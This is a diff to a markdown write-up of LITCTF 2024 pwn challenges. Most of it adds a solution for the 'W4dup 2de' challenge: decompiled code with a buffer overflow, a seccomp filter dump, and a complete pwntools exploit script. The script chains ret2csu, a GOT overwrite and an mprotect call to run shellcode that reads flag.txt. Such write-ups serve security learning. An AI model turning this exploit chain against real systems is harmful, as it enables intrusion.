@@ -775,7 +775,7 @@ Flag: LITCTF{t0d4y_15_l1t3rally_th3_d4y_b3f0re_the_c0nt3st}
 
 ### PWN WRITEUP SOON
 
-Function Pairing
+#### Function Pairing
 
 ![image](https://github.com/user-attachments/assets/f8ba6ccb-cec0-450a-b127-04d89ae7c262)
 
@@ -783,7 +783,7 @@ I don't have my solve script for this again
 
 But it was just a basic ret2libc
  
-Infinite Echo
+#### Infinite Echo
 
 ![image](https://github.com/user-attachments/assets/fcb4bede-6eaa-4cf6-a5d2-3eb701f7bcb4)
 
@@ -791,7 +791,7 @@ No solve script but this was a format string bug
 
 GOT overwrite of printf to system
 
-Recurse
+#### Recurse
 
 ![image](https://github.com/user-attachments/assets/957bb89e-2af8-4abe-ae80-649425e6dd01)
 
@@ -864,11 +864,266 @@ if __name__ == '__main__':
     main()
 ```
 
-W4dup 2de
+#### W4dup 2de
 
 ![image](https://github.com/user-attachments/assets/25988898-c782-402a-a3ff-7355040c29b4)
 
-Iloveseccomp
+Here's what this main function does
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  init_seccomp(argc, argv, envp);
+  buf[read(0, buf, 0x100uLL) - 1] = 0;
+  return 0;
+}
+```
+
+Obvious buffer overflow
+
+There's seccomp rule which disables some syscalls
+
+```c
+__int64 init_seccomp()
+{
+  __int64 v1; // [rsp+18h] [rbp-8h]
+
+  v1 = seccomp_init(2147418112LL);
+  seccomp_rule_add(v1, 0LL, 0LL, 1LL);
+  seccomp_rule_add(v1, 0LL, 59LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 322LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 187LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 89LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 267LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 19LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 17LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 295LL, 0LL);
+  seccomp_rule_add(v1, 0LL, 327LL, 0LL);
+  return seccomp_load(v1);
+}
+```
+
+Syscall disallowed are:
+
+```
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x12 0xc000003e  if (A != ARCH_X86_64) goto 0020
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x0f 0xffffffff  if (A != 0xffffffff) goto 0020
+ 0005: 0x15 0x0e 0x00 0x00000011  if (A == pread64) goto 0020
+ 0006: 0x15 0x0d 0x00 0x00000013  if (A == readv) goto 0020
+ 0007: 0x15 0x0c 0x00 0x0000003b  if (A == execve) goto 0020
+ 0008: 0x15 0x0b 0x00 0x00000059  if (A == readlink) goto 0020
+ 0009: 0x15 0x0a 0x00 0x000000bb  if (A == readahead) goto 0020
+ 0010: 0x15 0x09 0x00 0x0000010b  if (A == readlinkat) goto 0020
+ 0011: 0x15 0x08 0x00 0x00000127  if (A == preadv) goto 0020
+ 0012: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0020
+ 0013: 0x15 0x06 0x00 0x00000147  if (A == preadv2) goto 0020
+ 0014: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0019
+ 0015: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # read(fd, buf, count)
+ 0016: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0020
+ 0017: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)
+ 0018: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0020
+ 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0020: 0x06 0x00 0x00 0x00000000  return KILL
+```
+
+My solution involves:
+- Using ret2csu (due to lack of available gadgets to control (rdi, rsi, rdx) to Stack Pivot
+- Overwrite the got of read to syscall
+- Make use of write to set rax to 0xa which is the syscall number of mprotect
+- Sets the bss region to rwx
+- Jump to shellcode there
+- Shellcode involves using open('flag.txt', 0) to open up the flag file then use sendfile() to print the content to stdout
+- Profit
+
+My solve script: [solve](https://github.com/7h30ry/writeups/blob/main/LITCTF%202024/Solve%20Scripts/W4dup%202de/solve.py)
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+from warnings import filterwarnings
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('main_patched')
+context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
+
+filterwarnings("ignore")
+context.log_level = 'info'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE: 
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+gdbscript = '''
+init-pwndbg
+b *0x4013bd
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+
+#    0x00000000004013b0 <+64>:    mov    rdx,r14
+#    0x00000000004013b3 <+67>:    mov    rsi,r13
+#    0x00000000004013b6 <+70>:    mov    edi,r12d
+#    0x00000000004013b9 <+73>:    call   QWORD PTR [r15+rbx*8]
+#    0x00000000004013bd <+77>:    add    rbx,0x1
+#    0x00000000004013c1 <+81>:    cmp    rbp,rbx
+#    0x00000000004013c4 <+84>:    jne    0x4013b0 <__libc_csu_init+64>
+#    0x00000000004013c6 <+86>:    add    rsp,0x8
+#    0x00000000004013ca <+90>:    pop    rbx
+#    0x00000000004013cb <+91>:    pop    rbp
+#    0x00000000004013cc <+92>:    pop    r12
+#    0x00000000004013ce <+94>:    pop    r13
+#    0x00000000004013d0 <+96>:    pop    r14
+#    0x00000000004013d2 <+98>:    pop    r15
+#    0x00000000004013d4 <+100>:   ret
+
+def init():
+    global io
+
+    io = start()
+
+
+def ret2csu(edi, rsi, rdx, rbx, rbp, ptr, junk):
+    csu_pop = 0x4013c6
+    csu_call = 0x4013b0
+
+    payload = flat([
+        csu_pop,
+        junk,
+        0x0,
+        rbp,
+        edi,
+        rsi,
+        rdx,
+        ptr,
+        csu_call,
+        junk,
+        0x1,
+        rsi,
+        0x3,
+        0x4,
+        0x5,
+        0x6
+    ])
+
+    return payload
+
+
+def solve():
+
+    ##############################################################################
+    # Stage 1: Stack Pivot to bss section
+    ##############################################################################
+    
+    offset = 40
+    leave_ret = 0x40132d # leave; ret;
+    data_addr = 0x404500 
+
+    stack_pivot = ret2csu(0, data_addr, 0x500, 0, 1, exe.got['read'], b'a'*8)
+
+    payload = flat({
+        offset: [
+            stack_pivot,
+            leave_ret
+        ]
+    })
+
+    io.send(payload)
+    info("stack pivot to: %#x", data_addr)
+
+    ##############################################################################
+    # Stage 2: Overwrite the got of read to syscall
+    ##############################################################################
+
+    overwrite = ret2csu(0, exe.got['read'], 1, 0, 1, exe.got['read'], b'b'*8)
+
+    ropchain = flat(
+        [   
+            b'a'*8,
+            overwrite
+        ]
+    )
+
+    """
+    Future read calls are now a syscall gadget
+    Also rax is the untouched on read return, so rax=0x1=SYS_write
+    So we now call write() to set rax
+    """
+
+    ##############################################################################
+    # Stage 3: Call write() to set rax to mprotect syscall number 
+    ##############################################################################
+
+    sys_number = 0xA
+    set_rax = ret2csu(1, data_addr, sys_number, 0, 1, exe.got['read'], b'c'*8)
+    
+    ropchain += set_rax
+ 
+    ################################################################################
+    # Stage 3: Call mprotect() to make data_addr readable/writeable/executable (rwx)
+    ################################################################################
+
+    page_size = 4096
+    data_page = data_addr & ~(page_size - 1)
+    prot = 0x7
+    size = 0x1000
+
+    mprotect = ret2csu(data_page, size, prot, 0, 1, exe.got['read'], b'd'*8)
+
+    ropchain += mprotect
+
+    ################################################################################
+    # Stage 3: Call shellcode: I'm doing sendfile(1, open('flag.txt', 0), 0, 0x100)
+    ################################################################################
+
+    sc_addr = data_addr + len(ropchain) + 8
+    info("shellcode address: %#x", sc_addr)
+
+    shellcode  =  asm('nop')*30
+    shellcode +=  asm(shellcraft.open(b'flag.txt\x00', constants.O_RDONLY))
+    shellcode +=  asm(shellcraft.sendfile(1, 'rax', 0x0, 0x100))
+    shellcode +=  asm(shellcraft.exit(0))
+
+    sleep(1)
+
+    ropchain += p64(sc_addr)
+    ropchain += shellcode
+
+    io.send(ropchain)
+    io.sendline(p8(0xf0))
+
+
+    io.interactive()
+
+
+
+def main():
+    
+    init()
+    solve()
+
+if __name__ == '__main__':
+    main()
+
+```
+
+
+
+####Iloveseccomp
 
 ![image](https://github.com/user-attachments/assets/4b536045-de7c-4de9-a0e1-5cfedb38e98b)
 
